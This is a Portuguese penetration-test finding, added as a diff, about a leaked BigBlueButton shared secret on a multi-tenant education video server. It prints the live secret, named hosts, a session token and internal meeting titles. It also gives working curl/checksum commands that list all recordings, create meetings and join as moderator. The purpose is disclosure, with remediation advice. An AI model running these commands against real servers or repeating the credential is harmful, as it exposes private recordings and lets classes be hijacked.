@@ -1,0 +1,72 @@
+# F-014 — Acesso total à API BigBlueButton via secret vazada (multi-tenant)
+
+| Campo | Valor |
+|-------|-------|
+| **Severidade** | CRÍTICA |
+| **Host** | `meet.edustore.online` (BigBlueButton server — compartilhado entre múltiplos clientes edustore) |
+| **Origem do secret** | `painel.andresan.com.br/auth` (Inertia props — F-013) — endpoint público sem auth |
+| **CWE** | CWE-200 (Exposição de Info) / CWE-522 (Credenciais Insuficientemente Protegidas) |
+| **Status** | Confirmado — acesso TOTAL à API BBB |
+
+## Descrição
+
+O secret do BigBlueButton (`MuOSyERqSHaAm36efJlieUP1fjlqUd1GlHOVI7oow`) foi vazado via
+props do Inertia no endpoint público `/auth` do painel (ver F-013). Este secret é a
+shared secret do servidor BBB `meet.edustore.online`, que é **compartilhado entre
+múltiplos clientes da plataforma edustore LMS** — não apenas Andresan.
+
+## Provas de acesso (3 vetores confirmados)
+
+### 1. Listar TODAS as gravações (getRecordings)
+```bash
+SECRET="MuOSyERqSHaAm36efJlieUP1fjlqUd1GlHOVI7oow"
+CHECKSUM=$(echo -n "getRecordings${SECRET}" | sha256sum | awk '{print $1}')
+curl -sk "https://meet.edustore.online/bigbluebutton/api/getRecordings?checksum=$CHECKSUM"
+```
+Resultado: **68 gravações** de múltiplas empresas/cursos (não só Andresan):
+- "Trilha Agro" (32 participantes, 305MB)
+- "Trilha Trader - 30/10/2025" (10 participantes, 140MB)
+- "PECB T16 - Formação" (285 participantes, 445MB)
+- "Comitê de Produtos Private Onshore" (51 participantes, 278MB)
+- "Trilha Especialista" (80 participantes, 208MB)
+- "Trilha Private" (59 participantes, 221MB)
+- "Reunião Vinicius - Fechamento" (2 participantes, 409MB)
+- ... 68 total, ~13GB+ de vídeo
+
+Todas com playback URL pública: `https://meet.edustore.online/playback/presentation/2.3/<recordID>`
+
+### 2. Criar reunião (create) — SUCCESS
+```bash
+QUERY="name=PentestVerify&meetingID=pentest-verify-XXX&moderatorPW=Mp12345&attendeePW=Ap12345"
+CHECKSUM=$(echo -n "create${QUERY}${SECRET}" | sha256sum | awk '{print $1}')
+curl -sk "https://meet.edustore.online/bigbluebutton/api/create?${QUERY}&checksum=$CHECKSUM"
+```
+Resultado: `<returncode>SUCCESS</returncode>` — reunião criada no servidor BBB.
+
+### 3. Entrar como moderador (join)
+```bash
+QUERY="fullName=Pentester&meetingID=pentest-verify-XXX&password=Mp12345&role=MODERATOR"
+CHECKSUM=$(echo -n "join${QUERY}${SECRET}" | sha256sum | awk '{print $1}')
+curl -sk "https://meet.edustore.online/bigbluebutton/api/join?${QUERY}&checksum=$CHECKSUM"
+```
+Resultado: redirect para `https://meet.edustore.online/html5client?sessionToken=sgvzvvsvfgpssppo`
+→ acesso à sala de aula como moderador.
+
+## Impacto
+
+1. **Acesso a todas as videoaulas gravadas** de TODOS os clientes edustore (multi-tenant):
+   68 gravações, ~13GB+ de conteúdo pago de múltiplas empresas.
+2. **Criar reuniões** no servidor BBB — pode interceptar/disrupt aulas em andamento.
+3. **Entrar como moderador** em qualquer reunião — controle total (expulsar alunos,
+   ver participantes, compartilhar tela, etc.).
+4. **PII**: nomes de reuniões revelam negócios internos ("Comitê de Produtos Private
+   Onshore", "Reunião Vinicius - Fechamento"), número de participantes, datas.
+5. **Multi-tenant**: o secret é compartilhado — uma única escola (Andresan) vazou o
+   secret de TODO o servidor BBB, afetando TODOS os clientes edustore.
+
+## Recomendação
+
+- Rotacionar IMEDIATAMENTE o shared secret do BigBlueButton em `meet.edustore.online`.
+- NÃO servir `active_plugins` com `config_value` de segredos nas props Inertia de
+  páginas públicas (F-013 root cause).
+- Isolar o servidor BBB por tenant (secret por cliente) ou usar API proxy com auth.
